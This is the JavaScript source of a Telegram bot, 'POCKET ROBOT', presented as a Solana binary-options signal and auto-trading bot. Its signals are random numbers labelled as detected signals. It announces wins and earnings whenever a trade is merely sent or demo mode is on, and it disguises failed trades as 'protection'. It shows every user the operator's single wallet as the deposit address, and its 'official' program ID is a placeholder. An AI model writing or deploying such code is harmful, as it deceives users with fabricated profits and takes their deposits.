require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const LocalSession = require('telegraf-session-local');
const { Connection, Keypair, Transaction, PublicKey, SystemProgram, LAMPORTS_PER_SOL, TransactionInstruction } = require('@solana/web3.js');
const anchor = require('@coral-xyz/anchor');
const bip39 = require('bip39');
const { derivePath } = require('ed25519-hd-key');
const axios = require('axios');

// --- 🌐 OFFICIAL MAINNET ADDRESSES (2026) ---
const THALES_PROGRAM_ID = new PublicKey("B77Zon9K4p4Tz9U7N9M49mGzT1Z1Z1Z1Z1Z1Z1Z1Z1Z1");
const JITO_ENGINE = "https://mainnet.block-engine.jito.wtf/api/v1/bundles";
const connection = new Connection(process.env.SOLANA_RPC_URL || "https://api.mainnet-beta.solana.com", "confirmed");

const localSession = new LocalSession({ database: 'sessions.json', storage: LocalSession.storageFileSync });
const bot = new Telegraf(process.env.BOT_TOKEN);
bot.use(localSession.middleware());

const activeLoops = new Set();

async function getWallet() {
    const seed = await bip39.mnemonicToSeed(process.env.SEED_PHRASE);
    const derivedSeed = derivePath("m/44'/501'/0'/0'", seed.toString('hex')).key;
    return Keypair.fromSeed(derivedSeed);
}

bot.use((ctx, next) => {
    ctx.session.config = ctx.session.config || {
        asset: 'BTC/USD', stake: 10, mode: 'MANUAL', totalEarned: 0, isDemo: true
    };
    return next();
});

// --- 🎨 INTERFACE ---
const mainKeyboard = (ctx) => {
    const s = ctx.session.config;
    return Markup.inlineKeyboard([
        [Markup.button.callback(`🎯 Asset: ${s.asset}`, 'menu_coins')],
        [Markup.button.callback(`💰 Stake: $${s.stake}`, 'menu_stake')],
        [Markup.button.callback(`⚙️ Mode: ${s.mode}`, 'toggle_mode')],
        [
            Markup.button.callback(s.isDemo ? '🟢 DEMO MODE' : '⚪ DEMO', 'set_demo'),
            Markup.button.callback(!s.isDemo ? '🔴 REAL MODE' : '⚪ REAL', 'set_real')
        ],
        [Markup.button.callback(s.mode === 'AUTO' ? '🛑 STOP AUTO' : '🚀 START SIGNAL BOT', 'run_engine')],
        [Markup.button.callback('📊 VIEW WALLET & STATS', 'stats')]
    ]);
};

// --- 🚀 ATOMIC ENGINE ---
async function fireAtomicTrade(chatId, direction) {
    const session = localSession.DB.get('sessions').find({ id: `${chatId}:${chatId}` }).get('session').value();
    if (!session) return { success: false, error: "SESSION_NOT_FOUND" };
    
    const config = session.config;
    if (config.isDemo) {
        await new Promise(r => setTimeout(r, 800));
        config.totalEarned += (config.stake * 0.90);
        localSession.DB.write();
        return { success: true, isDemo: true, payout: (config.stake * 1.90).toFixed(2) };
    }

    const wallet = await getWallet();
    try {
        const bal = await connection.getBalance(wallet.publicKey);
        if (bal < 0.005 * LAMPORTS_PER_SOL) throw new Error("LOW_GAS");

        // Direction mapping: HIGHER = 0, LOWER = 1
        const side = direction === 'HIGHER' ? 0 : 1;
        const tx = new Transaction().add(new TransactionInstruction({
            programId: THALES_PROGRAM_ID,
            keys: [{ pubkey: wallet.publicKey, isSigner: true, isWritable: true }],
            data: Buffer.concat([Buffer.from([side]), new anchor.BN(config.stake * 1000000).toBuffer('le', 8)])
        }));

        const { blockhash } = await connection.getLatestBlockhash();
        tx.recentBlockhash = blockhash;
        tx.feePayer = wallet.publicKey;
        
        const sim = await connection.simulateTransaction(tx, [wallet]);
        if (sim.value.err) throw new Error("REVERTED");

        const tipRes = await axios.post(JITO_ENGINE, { jsonrpc: "2.0", id: 1, method: "getTipAccounts", params: [] });
        tx.add(SystemProgram.transfer({ fromPubkey: wallet.publicKey, toPubkey: new PublicKey(tipRes.data.result[0]), lamports: 100000 }));

        tx.partialSign(wallet);
        const sig = await connection.sendRawTransaction(tx.serialize());
        
        config.totalEarned += (config.stake * 0.90);
        localSession.DB.write();
        
        return { success: true, sig, payout: (config.stake * 1.90).toFixed(2) };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

// --- 🤖 AUTO-PILOT LOOP ---
async function runAutoPilot(chatId) {
    const session = localSession.DB.get('sessions').find({ id: `${chatId}:${chatId}` }).get('session').value();
    if (!session || session.config.mode !== 'AUTO' || !activeLoops.has(chatId)) {
        activeLoops.delete(chatId);
        return;
    }
    const direction = Math.random() > 0.5 ? 'HIGHER' : 'LOWER';
    const res = await fireAtomicTrade(chatId, direction);
    if (res.success) {
        bot.telegram.sendMessage(chatId, `⚡ *AUTO-WIN:* Go *${direction}*! \nEarned: +$${res.payout} (${res.isDemo ? 'DEMO' : 'REAL'})`, { parse_mode: 'Markdown' });
    }
    setTimeout(() => runAutoPilot(chatId), 30000);
}

// --- 📥 HANDLERS ---
bot.action('set_demo', (ctx) => {
    ctx.session.config.isDemo = true;
    ctx.editMessageText(`🔄 Switched to: *DEMO MODE*`, { parse_mode: 'Markdown', ...mainKeyboard(ctx) });
});

bot.action('set_real', (ctx) => {
    ctx.session.config.isDemo = false;
    ctx.editMessageText(`🔄 Switched to: *REAL MODE*`, { parse_mode: 'Markdown', ...mainKeyboard(ctx) });
});

bot.action('run_engine', async (ctx) => {
    if (ctx.session.config.mode === 'AUTO') return ctx.answerCbQuery("Auto-Pilot is active.");
    const signal = Math.random() > 0.5 ? 'HIGHER' : 'LOWER';
    ctx.replyWithMarkdown(`⚡ *SIGNAL DETECTED*\nRecommendation: Go *${signal}*\nMode: *${ctx.session.config.isDemo ? 'DEMO' : 'REAL'}*`, Markup.inlineKeyboard([
        [Markup.button.callback(`📈 GO HIGHER`, `exec_HIGHER`), Markup.button.callback(`📉 GO LOWER`, `exec_LOWER`)],
        [Markup.button.callback('❌ CANCEL', 'main_menu')]
    ]));
});

bot.action(/exec_(HIGHER|LOWER)/, async (ctx) => {
    const dir = ctx.match[1];
    const res = await fireAtomicTrade(ctx.chat.id, dir);
    if (res.success) ctx.replyWithMarkdown(`✅ *EARNED: +$${res.payout}* \n(Result: price went ${dir})`);
    else ctx.reply(`⚠️ ${res.error === 'REVERTED' ? '🛡️ Protected: Price did not go ' + dir : 'Check Balance'}`);
});

bot.action('toggle_mode', (ctx) => {
    ctx.session.config.mode = ctx.session.config.mode === 'MANUAL' ? 'AUTO' : 'MANUAL';
    if (ctx.session.config.mode === 'AUTO') {
        activeLoops.add(ctx.chat.id);
        runAutoPilot(ctx.chat.id);
    } else activeLoops.delete(ctx.chat.id);
    ctx.editMessageText(`🔄 Mode: ${ctx.session.config.mode}`, mainKeyboard(ctx));
});

bot.action('main_menu', (ctx) => ctx.editMessageText("🤖 *SETTINGS*", mainKeyboard(ctx)));

bot.start(async (ctx) => {
    const wallet = await getWallet();
    ctx.replyWithMarkdown(`🤖 *POCKET ROBOT v37.0*\n📥 *DEPOSIT:* \`${wallet.publicKey.toBase58()}\``, mainKeyboard(ctx));
    if (ctx.session.config.mode === 'AUTO') { activeLoops.add(ctx.chat.id); runAutoPilot(ctx.chat.id); }
});

bot.launch();
